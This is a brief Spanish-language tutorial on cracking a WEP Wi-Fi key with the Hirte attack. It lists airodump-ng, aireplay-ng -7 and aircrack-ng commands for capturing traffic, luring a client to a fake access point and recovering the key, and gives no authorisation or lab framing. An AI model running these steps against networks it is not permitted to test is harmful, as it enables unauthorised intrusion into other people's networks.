# Cracking WEP utilizando el Ataque Hirte

El ataque Hirte permite romper la clave WEP de una red inalámbrica inaccesible al atacante, aprovechando que el dispositivo cliente  se encuentra cerca. Para lograrlo, se crea un punto de acceso falso con el mismo SSID de la red WEP, provocando que el dispositivo cliente se conecte automáticamente. Esto genera paquetes ARP que contienen fragmentos de la clave WEP, facilitando su descifrado.

Capturar paquetes

```
airodump-ng <interfaz>
```

Una vez que se sabe el objetivo se captura los paquetes con este comando

```
airodump-ng --bssid <BSSID> --channel <canal> -w <archivo_salida> <interfaz>
```

Realizar ataque de fragmentación

```
aireplay-ng -7 -D -e [SSID] -a [BSSID] <interfaz>
```

Descifrar la clave WEP

```bash
aircrack-ng -b <BSSID> <archivo_salida>.cap
```

Mas informacion:

[https://www.aircrack-ng.org/doku.php?id=hirte](https://www.aircrack-ng.org/doku.php?id=hirte)
